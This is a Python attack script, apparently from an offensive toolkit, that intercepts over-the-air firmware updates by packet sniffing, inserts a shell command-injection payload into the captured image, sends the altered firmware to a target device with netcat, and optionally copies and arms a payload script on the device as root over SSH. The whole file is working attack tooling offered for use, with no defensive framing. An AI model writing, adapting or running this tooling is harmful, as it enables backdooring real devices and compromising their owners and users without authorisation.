#!/usr/bin/env python3
# Route: modules/attacks/ota_firmware_injector.py
# Real OTA Firmware Backdoor Injection with Python payload execution

import subprocess
import argparse
import os
from scapy.all import sniff, TCP, Raw

FIRMWARE_ORIGINAL = "original_firmware.bin"
FIRMWARE_MODIFIED = "modified_firmware.bin"
PAYLOAD_SCRIPT_NAME = "payload_launcher.py"
BACKDOOR_PAYLOAD = f";python3 /tmp/{PAYLOAD_SCRIPT_NAME};".encode('utf-8')  # Command injection payload

def intercept_firmware(interface, port, timeout):
    print(f"[+] Intercepting OTA firmware on interface {interface}, TCP port {port}")
    firmware_data = bytearray()

    def packet_handler(packet):
        if TCP in packet and packet[TCP].dport == port and Raw in packet:
            firmware_data.extend(packet[Raw].load)

    sniff(iface=interface, filter=f"tcp port {port}", prn=packet_handler, timeout=timeout)

    if firmware_data:
        with open(FIRMWARE_ORIGINAL, "wb") as fw_file:
            fw_file.write(firmware_data)
        print(f"[+] Firmware intercepted successfully ({len(firmware_data)} bytes)")
        return True
    else:
        print("[!] No firmware data intercepted.")
        return False

def inject_backdoor(original_fw, modified_fw, payload):
    print("[+] Injecting Python backdoor execution payload into firmware")
    with open(original_fw, "rb") as orig:
        firmware = orig.read()

    inject_offset = firmware.find(b'\xFF\xFF\xFF')  # Example: injection marker, adjust per firmware specifics
    if inject_offset == -1:
        inject_offset = len(firmware) // 2  # Default midpoint injection if no marker found

    modified_firmware = firmware[:inject_offset] + payload + firmware[inject_offset:]

    with open(modified_fw, "wb") as mod:
        mod.write(modified_firmware)

    print(f"[+] Firmware successfully injected with payload at offset {inject_offset}")

def broadcast_firmware(target_ip, port):
    print(f"[+] Broadcasting modified firmware to {target_ip}:{port}")

    command = [
        "nc",
        "-w", "3",
        target_ip,
        str(port)
    ]

    with open(FIRMWARE_MODIFIED, "rb") as firmware:
        subprocess.run(command, stdin=firmware, check=True)

    print("[+] Modified firmware broadcast completed")

def deploy_payload_script(target_ip):
    print(f"[+] Deploying payload_launcher.py script to {target_ip}")
    subprocess.run(["scp", PAYLOAD_SCRIPT_NAME, f"root@{target_ip}:/tmp/{PAYLOAD_SCRIPT_NAME}"], check=True)
    subprocess.run(["ssh", f"root@{target_ip}", f"chmod +x /tmp/{PAYLOAD_SCRIPT_NAME}"], check=True)
    print("[+] Payload script deployed and permissions set")

def cleanup():
    print("[+] Cleaning temporary firmware files")
    for f in [FIRMWARE_ORIGINAL, FIRMWARE_MODIFIED]:
        if os.path.exists(f):
            os.remove(f)
            print(f"[+] Removed {f}")

def main():
    parser = argparse.ArgumentParser(description="Real OTA Firmware Injector with Python Payload Launcher")
    parser.add_argument("--interface", required=True, help="Interface for OTA interception")
    parser.add_argument("--listen-port", type=int, required=True, help="OTA transmission port")
    parser.add_argument("--broadcast-ip", required=True, help="Target device IP")
    parser.add_argument("--broadcast-port", type=int, required=True, help="Port to broadcast modified firmware")
    parser.add_argument("--timeout", type=int, default=60, help="Sniffing duration (seconds)")
    parser.add_argument("--deploy-payload", action="store_true", help="Deploy payload script after firmware injection")

    args = parser.parse_args()

    try:
        intercepted = intercept_firmware(args.interface, args.listen_port, args.timeout)

        if intercepted:
            inject_backdoor(FIRMWARE_ORIGINAL, FIRMWARE_MODIFIED, BACKDOOR_PAYLOAD)
            broadcast_firmware(args.broadcast_ip, args.broadcast_port)
            
            if args.deploy_payload:
                deploy_payload_script(args.broadcast_ip)

        else:
            print("[!] Firmware interception failed, aborting.")

    except subprocess.CalledProcessError as e:
        print(f"[!] Subprocess error: {e}")

    except KeyboardInterrupt:
        print("[+] Operation aborted by user.")

    finally:
        cleanup()

if __name__ == "__main__":
    main()
